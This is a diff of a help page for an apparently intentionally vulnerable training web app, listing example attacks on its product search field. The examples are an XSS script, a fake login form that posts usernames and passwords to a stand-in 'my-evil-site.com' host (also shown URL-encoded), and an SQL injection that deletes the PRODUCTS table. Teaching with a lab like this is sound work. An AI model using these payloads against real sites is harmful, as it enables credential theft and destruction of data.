@@ -31,25 +31,59 @@
                                 below:
                             </p>
 
-                            <h3>XSS Attack :: Product Search field</h3>
-                            <p>The search field on the <em>Product</em> page displays the search keywords entered.
-                            This allows you carry out a malicious XSS attack by entering JavaScript code. Here are
-                            some examples of what you could enter in the "keywords" field:</p>
-                            <code>
-                                &lt;script>alert("I am hacking!")&lt;/script>
-                            </code>
-                            <p>or:</p>
-                            <code>
-                                &lt;iframe width="560" height="315" src="https://www.youtube.com/embed/ub82Xb1C8os?autoplay=1" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen>&lt;/iframe>
-                            </code>
+                            <h3>XSS Injection Example</h3>
+                            <p>
+                                The <em>Product</em> page re-displays any search keywords entered. This is not necessarily
+                                a problem but you will notice that a parameter "keywords" is used and can be passed in the
+                                URL automatically. We can use this to carry out XSS injection.
+                            <p>
+                            <p>
+                                A simple example would be to execute some Javascript:
+                            </p>
+                            <pre>
+    &lt;script>alert("I am hacking!")&lt;/script>
+                            </pre>
+                            <p>
+                                or the same JavaScript URL encoded:
+                            </p>
+                            <pre>
+    %3Cscript%3Ealert%28%22I am hacking!%22%29%3C%2Fscript%3E%0A
+                            </pre>
+                            <p>
+                                Another example would be to present a login form which we could use to capture the users
+                                credentials:
+                            </p>
+                            <pre>
+    &lt;form action="http://my-evil-site.com" method="post" class="form-login">
+        &lt;h5>Please login to continue:&lt;/h5>
+        &lt;div class="form-group">
+            &lt;input type="text" id="username" name="username" class="form-control" autofocus="autofocus" placeholder="Username">
+        &lt;/div>
+        &lt;div class="form-group mb-0">
+            &lt;input type="password" id="password" name="password" class="form-control" placeholder="Password">
+        &lt;/div>
+        &lt;button class="btn btn-lg btn-primary btn-block" name="login-submit" id="login-submit" type="submit">Login&lt;/button>
+    &lt;/form>
+                            </pre>
+                            <p>or the same form URL encoded:</p>
+                            <pre>
+    %3Cform%20action%3D%22http%3A%2F%2Fmy-evil-site.com%22%20method%3D%22post%22%20class%3D%22form-login%22%3E%0A%09%3Ch5%3EPlease%20login%20to%20continue%3A%3C%2Fh5%3E%0A%09%3Cdiv%20class%3D%22form-group%22%3E%0A%09%09%3Cinput%20type%3D%22text%22%20id%3D%22username%22%20name%3D%22username%22%20class%3D%22form-control%22%20autofocus%3D%22autofocus%22%20placeholder%3D%22Username%22%3E%0A%09%3C%2Fdiv%3E%0A%09%3Cdiv%20class%3D%22form-group%20mb-0%22%3E%0A%09%09%3Cinput%20type%3D%22password%22%20id%3D%22password%22%20name%3D%22password%22%20class%3D%22form-control%22%20placeholder%3D%22Password%22%3E%0A%09%3C%2Fdiv%3E%0A%09%3Cbutton%20class%3D%22btn%20btn-lg%20btn-primary%20btn-block%22%20name%3D%22login-submit%22%20id%3D%22login-submit%22%20type%3D%22submit%22%3ELogin%3C%2Fbutton%3E%0A%3C%2Fform%3E
+                            </pre>
 
-                            <h3>SQL Injection :: Product Search field</h3>
-                            <p>The search field on the <em>Product</em> page passed the inputs straight through to as SQL.
-                                You can cause a serious by deleting the Product database by entering the following:</p>
-                            <code>
-                                %'; DELETE FROM PRODUCTS; --
-                            </code>
+                            <h3>SQL Injection Example</h3>
+                            <p>
+                                The search field on the <em>Product</em> page passed the inputs straight through as raw SQL input.
+                                You can cause a serious problem (deleting the Product database) by entering the following in the search field:
+                            </p>
+                            <pre>
+    %';DELETE%20FROM%20PRODUCTS;--
+                            </pre>
+                            <p>
+                                Dont worry, the database is automatically created/populated on startup so you can simply
+                                restart the application to get the data back.
+                            </p>
 
+                            <h3>JSON Injection Example</h3>
                         </div>
                     </div>
 
